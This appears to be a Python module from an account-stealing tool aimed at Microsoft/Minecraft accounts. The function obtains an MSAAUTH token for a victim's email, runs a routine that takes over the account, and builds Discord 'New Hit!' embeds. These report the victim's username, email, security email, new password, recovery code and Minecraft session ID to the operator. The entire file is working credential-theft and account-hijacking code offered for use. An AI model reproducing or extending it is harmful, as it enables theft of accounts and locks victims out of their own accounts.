from views.utils.getMSAAUTH import getMSAAUTH
from views.utils.securing.secure import secure
from discord import Embed
import json

def startSecuringAccount(email: str, device: str = None, code: str = None):
    if not device:
        device = json.load(open("data.json", "r+"))["flowtoken"] 
    
    # str or None
    msaauth = getMSAAUTH(email, device, code)
    
    if msaauth is None:
        print("[-] - Failed to get MSAAUTH")
        return msaauth
    
    print("[+] - Got MSAAUTH | Starting to secure...")
    account = secure(msaauth)
    print(account)

    hit_embed = Embed(
        title = f"New Hit!"
    )

    # To replace oldEmail -> Email (New Main Alias)
    hit_embed.add_field(name="Username", value=f"`{account["oldName"]}`", inline=False)
    hit_embed.add_field(name="Method", value=f"`{account["method"]}`", inline=True)
    hit_embed.add_field(name="Capes", value=f"`{account["capes"]}`", inline=True)
    hit_embed.add_field(name="Email", value=f"`{account["oldEmail"]}`", inline=True)
    hit_embed.add_field(name="Security Email", value=f"`{account["secEmail"]}`", inline=True)
    hit_embed.add_field(name="Password", value=f"`{account["password"]}`", inline=False)
    hit_embed.add_field(name="Recovery Code", value=f"`{account["recoveryCode"]}`", inline=False)


    if account["SSID"] != "Failed to Get":
        session_embed = Embed(
            title = f"Got Minecraft Session! | {account["oldName"]}",
            description = f"```{account["SSID"]}```"
        )

        return [hit_embed, session_embed]

    return [hit_embed]